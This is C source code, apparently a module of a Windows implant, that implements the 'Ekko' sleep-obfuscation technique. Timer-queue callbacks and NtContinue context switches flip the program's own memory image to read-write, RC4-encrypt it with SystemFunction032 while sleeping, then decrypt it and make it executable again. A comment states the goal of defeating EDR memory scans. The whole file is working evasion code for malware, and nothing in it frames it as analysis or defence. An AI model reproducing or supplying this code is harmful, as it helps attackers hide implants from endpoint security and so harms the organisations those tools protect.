#include <windows.h>
#include <stdlib.h>
#include <string.h>

#include "modules/sleep_obf.h"

/* SystemFunction032(data, key) — RC4 in-place. data.Buffer is XOR'd against a
 * keystream derived from key.Buffer. Symmetric, so calling it twice with the
 * same key decrypts. Undocumented; exported from advapi32.dll (cryptbase in
 * newer builds re-exports it). */
typedef struct _USTRING {
    DWORD  Length;
    DWORD  MaximumLength;
    PUCHAR Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *pfn_NtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *pfn_SystemFunction032)(USTRING *, USTRING *);

static pfn_NtContinue        g_NtContinue        = NULL;
static pfn_SystemFunction032 g_SystemFunction032 = NULL;
static PVOID                 g_ImageBase         = NULL;
static DWORD                 g_ImageSize         = 0;

int sleep_obf_init(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    g_NtContinue = (pfn_NtContinue)GetProcAddress(ntdll, "NtContinue");
    if (!g_NtContinue) return -1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return -1;
    g_SystemFunction032 = (pfn_SystemFunction032)GetProcAddress(advapi, "SystemFunction032");
    if (!g_SystemFunction032) return -1;

    /* Resolve our own image base via VirtualQuery on a known-in-module address. */
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery((LPCVOID)&sleep_obf_init, &mbi, sizeof(mbi)))
        return -1;
    g_ImageBase = mbi.AllocationBase;
    if (!g_ImageBase) return -1;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ImageBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)g_ImageBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return -1;
    g_ImageSize = nt->OptionalHeader.SizeOfImage;

    return 0;
}

void ekko_sleep(DWORD timeout_ms) {
    if (!g_NtContinue || !g_SystemFunction032 || !g_ImageBase || !g_ImageSize) {
        Sleep(timeout_ms);
        return;
    }

    CONTEXT CtxThread = {0};
    CONTEXT RopProtRW = {0}, RopMemEnc = {0}, RopDelay = {0};
    CONTEXT RopMemDec = {0}, RopProtRX = {0}, RopSetEvt = {0};

    HANDLE hEvent      = CreateEventW(NULL, FALSE, FALSE, NULL);
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hNewTimer   = NULL;
    DWORD  OldProt     = 0;

    if (!hEvent || !hTimerQueue) {
        if (hEvent)      CloseHandle(hEvent);
        if (hTimerQueue) DeleteTimerQueueEx(hTimerQueue, NULL);
        Sleep(timeout_ms);
        return;
    }

    /* Fresh RC4 key each cycle — an EDR scanning the process at rest sees
     * a different ciphertext every sleep. */
    UCHAR key_buf[16];
    for (int i = 0; i < 16; i++) key_buf[i] = (UCHAR)(rand() & 0xFF);
    USTRING Key = { .Length = 16, .MaximumLength = 16, .Buffer = key_buf };
    USTRING Img = { .Length = g_ImageSize, .MaximumLength = g_ImageSize,
                    .Buffer = (PUCHAR)g_ImageBase };

    /* Capture a timer thread's CONTEXT — gives us a valid Rsp we can clone. */
    if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread,
            0, 0, WT_EXECUTEINTIMERTHREAD)) {
        DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
        CloseHandle(hEvent);
        Sleep(timeout_ms);
        return;
    }
    WaitForSingleObject(hEvent, 50);  /* give the capture callback time to run */

    memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

    /* Each stage: NtContinue jumps to Rip with x64 fastcall args in Rcx/Rdx/R8/R9.
     * The Rsp -= 8 leaves shadow-space room; the return from each stage
     * lands back in ntdll's timer wrapper. */
    RopProtRW.Rsp -= 8;
    RopProtRW.Rip  = (DWORD64)VirtualProtect;
    RopProtRW.Rcx  = (DWORD64)g_ImageBase;
    RopProtRW.Rdx  = g_ImageSize;
    RopProtRW.R8   = PAGE_READWRITE;
    RopProtRW.R9   = (DWORD64)&OldProt;

    RopMemEnc.Rsp -= 8;
    RopMemEnc.Rip  = (DWORD64)g_SystemFunction032;
    RopMemEnc.Rcx  = (DWORD64)&Img;
    RopMemEnc.Rdx  = (DWORD64)&Key;

    /* GetCurrentProcess() returns the pseudo-handle 0xFFFFFFFFFFFFFFFF which
     * never signals, so this waits the full timeout. */
    RopDelay.Rsp -= 8;
    RopDelay.Rip  = (DWORD64)WaitForSingleObject;
    RopDelay.Rcx  = (DWORD64)GetCurrentProcess();
    RopDelay.Rdx  = timeout_ms;

    RopMemDec.Rsp -= 8;
    RopMemDec.Rip  = (DWORD64)g_SystemFunction032;
    RopMemDec.Rcx  = (DWORD64)&Img;
    RopMemDec.Rdx  = (DWORD64)&Key;

    RopProtRX.Rsp -= 8;
    RopProtRX.Rip  = (DWORD64)VirtualProtect;
    RopProtRX.Rcx  = (DWORD64)g_ImageBase;
    RopProtRX.Rdx  = g_ImageSize;
    RopProtRX.R8   = PAGE_EXECUTE_READWRITE;
    RopProtRX.R9   = (DWORD64)&OldProt;

    RopSetEvt.Rsp -= 8;
    RopSetEvt.Rip  = (DWORD64)SetEvent;
    RopSetEvt.Rcx  = (DWORD64)hEvent;

    /* Stagger each stage 100ms apart, plus timeout_ms for the sleep itself. */
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopProtRW, 100,                0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopMemEnc, 200,                0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopDelay,  300,                0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopMemDec, 300 + timeout_ms,   0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopProtRX, 400 + timeout_ms,   0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_NtContinue,
        &RopSetEvt, 500 + timeout_ms,   0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);

    /* INVALID_HANDLE_VALUE == wait for all callbacks to finish before returning */
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    CloseHandle(hEvent);
}
